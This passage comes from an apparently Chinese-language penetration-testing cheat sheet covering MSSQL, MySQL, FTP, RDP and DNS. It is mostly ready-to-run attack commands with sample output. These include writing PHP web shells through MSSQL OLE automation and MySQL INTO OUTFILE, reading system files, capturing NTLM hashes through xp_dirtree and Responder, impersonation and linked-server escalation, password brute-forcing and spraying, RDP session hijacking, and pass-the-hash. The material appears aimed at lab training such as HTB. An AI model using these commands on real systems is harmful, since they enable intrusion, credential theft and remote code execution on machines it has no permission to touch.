class="line">RECONFIGURE</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><h2 id="wirte"><a href="#wirte" class="headerlink" title="wirte"></a>wirte</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 启用Ole 自动化程序（这需要管理员权限）</span><br><span class="line"><span class="number">1</span>&gt; sp_configure &#x27;show advanced options&#x27;, <span class="number">1</span></span><br><span class="line"><span class="number">2</span>&gt; GO</span><br><span class="line"><span class="number">3</span>&gt; RECONFIGURE</span><br><span class="line"><span class="number">4</span>&gt; GO</span><br><span class="line"><span class="number">5</span>&gt; sp_configure &#x27;Ole Automation Procedures&#x27;, <span class="number">1</span></span><br><span class="line"><span class="number">6</span>&gt; GO</span><br><span class="line"><span class="number">7</span>&gt; RECONFIGURE</span><br><span class="line"><span class="number">8</span>&gt; GO</span><br><span class="line"></span><br><span class="line"># 创建文件</span><br><span class="line"><span class="number">1</span>&gt; DECLARE @OLE INT</span><br><span class="line"><span class="number">2</span>&gt; DECLARE @FileID INT</span><br><span class="line"><span class="number">3</span>&gt; EXECUTE sp_OACreate &#x27;Scripting.FileSystemObject&#x27;, @OLE OUT</span><br><span class="line"><span class="number">4</span>&gt; EXECUTE sp_OAMethod @OLE, &#x27;OpenTextFile&#x27;, @FileID OUT, &#x27;c:\inetpub\wwwroot\webshell.php&#x27;, <span class="number">8</span>, <span class="number">1</span></span><br><span class="line"><span class="number">5</span>&gt; EXECUTE sp_OAMethod @FileID, &#x27;WriteLine&#x27;, Null, &#x27;&lt;?php <span class="built_in">echo</span> shell_exec($_GET[&quot;c&quot;]);?&gt;&#x27;</span><br><span class="line"><span class="number">6</span>&gt; EXECUTE sp_OADestroy @FileID</span><br><span class="line"><span class="number">7</span>&gt; EXECUTE sp_OADestroy @OLE</span><br><span class="line"><span class="number">8</span>&gt; GO</span><br></pre></td></tr></table></figure><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>默认情况下，<code>MSSQL</code>允许读取操作系统中该帐户具有读取权限的任何文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&gt; SELECT * FROM OPENROWSET(BULK N&#x27;C:/Windows/System32/drivers/etc/hosts&#x27;, SINGLE_CLOB) AS Contents</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure><h2 id="Capture-Hash"><a href="#Capture-Hash" class="headerlink" title="Capture Hash"></a>Capture Hash</h2><p>使用 xp_subdirs 或 xp_dirtree 未记录的存储过程窃取 MSSQL 服务帐户哈希，这些存储过程使用 SMB 协议从文件系统中检索指定父目录下的子目录列表。当我们使用其中一个存储过程并将其指向我们的 SMB 服务器时，目录监听功能将强制服务器进行身份验证并发送运行 SQL Server 的服务帐户的 NTLMv2 哈希。</p><p>首先需要启动<a href="https://github.com/lgandx/Responder">Responder</a>或<a href="https://github.com/SecureAuthCorp/impacket">impacket-smbserver</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br><span class="line">或</span><br><span class="line">sudo impacket-smbserver share ./ -smb2support</span><br></pre></td></tr></table></figure><p>再执行<code>xp_dirtree</code>或<code>xp_subdirs</code>查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&gt; EXEC master..xp_dirtree &#x27;\\10.10.110.17\share\&#x27;</span><br><span class="line">2&gt; GO</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line"></span><br><span class="line">1&gt; EXEC master..xp_subdirs &#x27;\\10.10.110.17\share\&#x27;</span><br><span class="line">2&gt; GO</span><br></pre></td></tr></table></figure><h2 id="模拟现有用户"><a href="#模拟现有用户" class="headerlink" title="模拟现有用户"></a>模拟现有用户</h2><p>SQL Server 具有一项特殊权限，名为<code>IMPERSONATE</code>，允许执行用户承担其他用户或登录的权限，直到上下文重置或会话结束。</p><p><strong>注意：</strong>建议<code>EXECUTE AS LOGIN</code>在<code>master</code>数据库中运行，因为默认情况下所有用户都有权访问该数据库。如果您尝试模拟的用户无权访问您正在连接的数据库，则会出现错误。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># 查看可以模仿的用户</span><br><span class="line"><span class="number">1</span>&gt; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#x27;IMPERSONATE&#x27;</span><br><span class="line">name</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br><span class="line">-----------------------------------------------</span><br><span class="line">sa</span><br><span class="line">ben</span><br><span class="line">valentin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 验证当前用户是否具有 sysadmin 权限；返回<span class="number">0</span>，表示没有 sysadmin 权限</span><br><span class="line"><span class="number">1</span>&gt; SELECT SYSTEM_USER</span><br><span class="line"><span class="number">2</span>&gt; SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br><span class="line"><span class="number">3</span>&gt; go</span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line">julio                                                                                                                    </span><br><span class="line">(<span class="number">1</span> rows affected)</span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line">          <span class="number">0</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> rows affected)                                                                           </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 模拟用户 sa</span><br><span class="line"><span class="number">1</span>&gt; EXECUTE AS LOGIN = &#x27;sa&#x27;</span><br><span class="line"><span class="number">2</span>&gt; SELECT SYSTEM_USER</span><br><span class="line"><span class="number">3</span>&gt; SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br><span class="line"><span class="number">4</span>&gt; GO</span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line">sa</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> rows affected)</span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line">          <span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> rows affected)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 恢复操作并返回到之前的用户</span><br><span class="line">REVERT</span><br></pre></td></tr></table></figure><h2 id="链接其他数据库"><a href="#链接其他数据库" class="headerlink" title="链接其他数据库"></a>链接其他数据库</h2><p><code>MSSQL</code>有一个配置选项，称为<a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine">链接服务器</a>。链接服务器通常配置为允许数据库引擎执行包含另一个 SQL Server 实例或其他数据库产品（如 Oracle）中的表的 Transact-SQL 语句。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 查看链接服务器</span><br><span class="line"><span class="number">1</span>&gt; SELECT srvname, isremote FROM sysservers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br><span class="line"></span><br><span class="line">srvname                             isremote</span><br><span class="line">----------------------------------- --------</span><br><span class="line">DESKTOP-MFERMN4\SQLEXPRESS          <span class="number">1</span></span><br><span class="line"><span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">12</span>\SQLEXPRESS                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span> rows affected)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看连接的用户及其权限</span><br><span class="line"><span class="number">1</span>&gt; EXECUTE(&#x27;select @@servername, @@version, system_user, is_srvrolemember(&#x27;&#x27;sysadmin&#x27;&#x27;)&#x27;) <span class="built_in">AT</span> [<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">12</span>\SQLEXPRESS]</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br><span class="line"></span><br><span class="line">------------------------------ ------------------------------ ------------------------------ -----------</span><br><span class="line">DESKTOP-<span class="number">0</span>L9D4KA\SQLEXPRESS     Microsoft SQL Server <span class="number">2019</span> (RTM sa_remote                                <span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> rows affected)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 读取文件</span><br><span class="line"><span class="number">1</span>&gt; EXECUTE(&#x27;select * from OPENROWSET(BULK &#x27;&#x27;C:/Users/Administrator/desktop/flag.txt&#x27;&#x27;, SINGLE_CLOB) AS Contents&#x27;) <span class="built_in">at</span> [local.test.linked.srv];</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure><hr><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>TCP 3306</p><p><code>MySQL</code>默认系统模式&#x2F;数据库：</p><ul><li><code>mysql</code>- 是系统数据库，其中包含存储 MySQL 服务器所需信息的表</li><li><code>information_schema</code>- 提供对数据库元数据的访问</li><li><code>performance_schema</code>- 是一种用于在低级别监控 MySQL 服务器执行的功能</li><li><code>sys</code>- 一组帮助 DBA 和开发人员解释性能模式收集的数据的对象</li></ul><h2 id="interact-1"><a href="#interact-1" class="headerlink" title="interact"></a>interact</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Linux - mysql</span><br><span class="line">mysql -u username -pPassword -h 10.129.20.13</span><br><span class="line"></span><br><span class="line"># Windows - mysql.exe</span><br><span class="line">C:\&gt; mysql.exe -u username -pPassword -h 10.129.20.13</span><br></pre></td></tr></table></figure><h2 id="nmap-2"><a href="#nmap-2" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -sC -p3306 10.10.10.125</span><br></pre></td></tr></table></figure><h2 id="wirte-1"><a href="#wirte-1" class="headerlink" title="wirte"></a>wirte</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/webshell.php&#x27;;</span><br><span class="line"></span><br><span class="line"># 条件</span><br><span class="line">mysql&gt; show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure><h2 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</span><br></pre></td></tr></table></figure><hr><h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p>TCP 20 TCP 21</p><h2 id="interact-2"><a href="#interact-2" class="headerlink" title="interact"></a>interact</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp anonymous@10.129.20.13</span><br><span class="line"></span><br><span class="line"># 下载所有文件</span><br><span class="line">wget -m --no-passive ftp://anonymous@10.129.200.209:30021</span><br></pre></td></tr></table></figure><h2 id="nmap-3"><a href="#nmap-3" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -sC -sV -p 21 192.168.2.142 </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT</span><br><span class="line">Nmap scan report for 192.168.2.142</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner</span><br><span class="line">| d--x--x--x   2 root     root         1024 Jan 14  2002 bin</span><br><span class="line">| d--x--x--x   2 root     root         1024 Aug 10  1999 etc</span><br><span class="line">| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]</span><br><span class="line">| d--x--x--x   2 root     root         1024 Jan 14  2002 lib</span><br><span class="line">| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub</span><br><span class="line">|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.</span><br></pre></td></tr></table></figure><h2 id="anonymous"><a href="#anonymous" class="headerlink" title="anonymous"></a>anonymous</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ftp anonymous@192.168.2.142</span><br></pre></td></tr></table></figure><h2 id="crack-1"><a href="#crack-1" class="headerlink" title="crack"></a>crack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.list -P pws.list ftp://10.129.220.123</span><br><span class="line"></span><br><span class="line">medusa -M ftp -h 10.129.203.7 -u fiona -P /usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure><h2 id="FTP-反弹攻击"><a href="#FTP-反弹攻击" class="headerlink" title="FTP 反弹攻击"></a>FTP 反弹攻击</h2><p>假设我们的目标是暴露在互联网上的<code>FTP_DMZ</code>服务器。同一网络中的另一台设备<code>Internal_DMZ</code>未暴露在互联网上。我们可以利用与<code>FTP_DMZ</code>服务器的连接，使用 FTP 反弹攻击进行扫描<code>Internal_DMZ</code>，并获取有关服务器开放端口的信息。</p><p>现代 FTP 服务器默认包含防止此类攻击的保护措施，但如果现代 FTP 服务器中的这些功能配置错误，则服务器可能容易受到 FTP 反弹攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT</span><br><span class="line">Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).</span><br><span class="line">Attempting connection to ftp://anonymous:password@10.10.110.213:21</span><br><span class="line">Connected:220 (vsFTPd 3.0.3)</span><br><span class="line">Login credentials accepted by FTP server!</span><br><span class="line">Initiating Bounce Scan at 04:55</span><br><span class="line">FTP command misalignment detected ... correcting.</span><br><span class="line">Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)</span><br><span class="line">Nmap scan report for 172.17.0.2</span><br><span class="line">Host is up.</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">80/tcp open http</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><hr><h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><p>TCP&#x2F;UDP 3389</p><h2 id="interact-3"><a href="#interact-3" class="headerlink" title="interact"></a>interact</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rdesktop -u admin -p password123 192.168.2.143</span><br><span class="line"></span><br><span class="line">$ xfreerdp /v:192.168.2.143 /u:admin /p:password123</span><br><span class="line">$ xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9</span><br></pre></td></tr></table></figure><h2 id="nmap-4"><a href="#nmap-4" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -Pn -p3389 192.168.2.143 </span><br><span class="line"></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27;, and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST</span><br><span class="line">Nmap scan report for 192.168.2.143</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">3389/tcp open ms-wbt-server</span><br></pre></td></tr></table></figure><h2 id="spraying-1"><a href="#spraying-1" class="headerlink" title="spraying"></a>spraying</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P &#x27;password123&#x27; RDP://目标IP</span><br><span class="line"># or</span><br><span class="line">crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c &#x27;password123&#x27;</span><br></pre></td></tr></table></figure><h2 id="Hijacking-Session"><a href="#Hijacking-Session" class="headerlink" title="Hijacking Session"></a>Hijacking Session</h2><p>需要<code>SYSTEM</code>权限并使用 Microsoft <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon">tscon.exe</a>二进制文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">query</span> <span class="title">user</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">USERNAME</span>              <span class="title">SESSIONNAME</span>        <span class="title">ID</span>  <span class="title">STATE</span>   <span class="title">IDLE</span> <span class="title">TIME</span>  <span class="title">LOGON</span> <span class="title">TIME</span></span></span><br><span class="line"><span class="function">&gt;<span class="title">juurena</span>               <span class="title">rdp</span>-<span class="title">tcp</span>#13          1  <span class="title">Active</span>          7  8/25/2021 1:23 <span class="title">AM</span></span></span><br><span class="line"><span class="function"> <span class="title">lewen</span>                 <span class="title">rdp</span>-<span class="title">tcp</span>#14          2  <span class="title">Active</span>          *  8/25/2021 1:28 <span class="title">AM</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">tscon</span> #&#123;<span class="title">TARGET_SESSION_ID</span>&#125; /<span class="title">dest</span>:#&#123;<span class="title">OUR_SESSION_NAME</span>&#125;</span></span><br><span class="line"><span class="function"># 创建一个<span class="title">Windows</span>服务，作为本地系统运行并以 <span class="title">SYSTEM</span> 权限执行任何二进制文件</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc.exe</span> <span class="title">create</span> <span class="title">sessionhijack</span> <span class="title">binpath</span>= &quot;<span class="title">cmd.exe</span> /<span class="title">k</span> <span class="title">tscon</span> 2 /<span class="title">dest:rdp</span>-<span class="title">tcp</span>#13&quot;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">net</span> <span class="title">start</span> <span class="title">sessionhijack</span></span></span><br></pre></td></tr></table></figure><blockquote><p>注意：此方法在 Server 2019 上不再有效。</p></blockquote><h2 id="PassTheHash-PtH"><a href="#PassTheHash-PtH" class="headerlink" title="PassTheHash (PtH)"></a>PassTheHash (PtH)</h2><p><code>Restricted Admin Mode</code> 默认情况下，它是被禁用的，但在目标主机上需要启用它，否则就会报错。</p><p>可以通过在<code>DisableRestrictedAdmin</code>下添加新的注册表项(REG_DWORD)来启用此功能<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</span><br></pre></td></tr></table></figure><p>连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9</span><br></pre></td></tr></table></figure><hr><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>TCP 53 UDP 53</p><h2 id="nmap-5"><a href="#nmap-5" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p53 -Pn -sV -sC 10.10.110.213</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT</span><br><span class="line">Nmap scan report for 10.10.110.213</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE  SERVICE     VERSION</span><br><span class="line">53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)</span><br></pre></td></tr></table></figure><h2 id="subdomain"><a href="#subdomain" class="headerlink" title="subdomain"></a>subdomain</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://example.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line"></span><br><span class="line">ffuf -w /path/to/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://example.htb -H &#x27;Host: FUZZ.example.htb&#x27;</span><br></pre></td></tr></table></figure><h2 id="DNS-Zone-transfer"><a href="#DNS-Zone-transfer" class="headerlink" title="DNS Zone transfer"></a>DNS Zone transfer</h2><p>DNS 区域是特定组织或管理员管理的 DNS 命名空间的一部分。由于 DNS 包含多个 DNS 区域，因此 DNS 服务器利用 DNS 区域传输将其数据库的一部分复制到另一台 DNS 服务器。除非 DNS 服务器配置正确（限制哪些 IP 可以执行 DNS 区域传输），否则任何人都可以向 DNS 服务器索取其区域信息的副本，因为 DNS 区域传输不需要任何身份验证。此外，DNS 服务通常在 UDP 端口上运行；但是，在执行 DNS 区域传输时，它使用 TCP 端口进行可靠的数据传输。</p><p>攻击者可以利用此 DNS 区域传输漏洞来了解有关目标组织的 DNS 命名空间的更多信息，从而增加攻击面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr inlanefrieght.htb @10.129.110.213</span><br><span class="line">;; global options: +cmd</span><br><span class="line">inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800</span><br><span class="line">inlanefrieght.htb.         604800  IN      AAAA    ::1</span><br><span class="line">inlanefrieght.htb.         604800  IN      NS      localhost.</span><br><span class="line">inlanefrieght.htb.         604800  IN      A       10.129.110.22</span><br><span class="line">admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21</span><br><span class="line">hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25</span><br><span class="line">support.inlanefrieght.htb. 604800  IN      A       10.129.110.28</span><br><span class="line">inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 28 msec</span><br><span class="line">;; SERVER: 10.129.110.213#53(10.129.110.213)</span><br><span class="line">;; WHEN: Mon Oct 11 17:20:13 EDT 2020</span><br><span class="line">;; XFR size: 8 records (messages 1, bytes 289)</span><br></pre></td></tr></table></figure><p>枚举根域的所有 DNS 服务器并扫描 DNS 区域传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">$ fierce --domain zonetransfer.me</span><br><span class="line"></span><br><span class="line">NS: nsztm2.digi.ninja. nsztm1.digi.ninja.</span><br><span class="line">SOA: nsztm1.digi.ninja. (81.4.108.41)</span><br><span class="line">Zone: success</span><br><span class="line">&#123;&lt;DNS name @&gt;: &#x27;@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 &#x27;</span><br><span class="line">               &#x27;172800 900 1209600 3600\n&#x27;</span><br><span class="line">               &#x27;@ 300 IN HINFO &quot;Casio fx-700G&quot; &quot;Windows XP&quot;\n&#x27;</span><br><span class="line">               &#x27;@ 301 IN TXT &#x27;</span><br><span class="line">               &#x27;&quot;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA&quot;\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 10 